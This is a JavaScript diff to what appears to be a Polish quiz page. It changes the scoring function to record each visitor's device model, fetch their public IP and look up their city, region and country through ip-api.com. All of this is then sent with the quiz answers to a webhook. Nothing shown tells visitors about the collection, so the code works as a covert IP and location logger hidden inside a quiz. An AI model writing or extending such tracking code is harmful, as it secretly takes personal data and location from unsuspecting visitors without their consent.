@@ -488,13 +488,15 @@ function calculateScore() {
   });
 
   const ua = navigator.userAgent;
-  const platform = navigator.platform || '';
-  let device = platform;
-  if (/android/i.test(ua)) device = 'Android';
-  else if (/iPhone|iPad|iPod/i.test(ua)) device = 'iOS';
-  else if (/Windows/i.test(ua)) device = 'Windows';
-  else if (/Mac/i.test(ua)) device = 'macOS';
-  else if (/Linux/i.test(ua)) device = 'Linux';
+  let device = 'Nieznane';
+  const androidMatch = ua.match(/Android\s+[\d.]+;\s*([^;)]+)/i);
+  if (androidMatch) device = androidMatch[1].trim();
+  else if (/iPhone|iPad|iPod/.test(ua)) {
+    const iOSModel = ua.match(/\(([^;]+);\s*CPU\s+iPhone/i);
+    device = iOSModel ? iOSModel[1].trim() : 'iOS';
+  } else if (/Windows/.test(ua)) device = 'Windows';
+  else if (/Mac/.test(ua)) device = 'macOS';
+  else if (/Linux/.test(ua)) device = 'Linux';
 
   const time = new Date().toLocaleString('pl-PL', { timeZone: 'Europe/Warsaw' });
 
@@ -524,12 +526,15 @@ function calculateScore() {
     fields.push({ name: 'Zaznaczone pytania', value: 'brak' });
   }
 
-  fetch('https://api64.ipify.org?format=json').then(r => r.json()).then(data => {
-    const ip = data.ip || 'nieznane';
+  Promise.all([
+    fetch('https://api64.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'nieznane'),
+    fetch('https://ip-api.com/json/?fields=city,regionName,country').then(r => r.json()).then(d => {
+      if (d && d.city) return d.city + (d.regionName ? ', ' + d.regionName : '') + (d.country ? ', ' + d.country : '');
+      return 'nieznana';
+    }).catch(() => 'nieznana')
+  ]).then(([ip, location]) => {
     fields.splice(3, 0, { name: 'IP', value: ip, inline: true });
-    sendWebhook(score, fields);
-  }).catch(() => {
-    fields.splice(3, 0, { name: 'IP', value: 'nieznane', inline: true });
+    fields.splice(4, 0, { name: 'Miejscowość', value: location, inline: true });
     sendWebhook(score, fields);
   });
 }
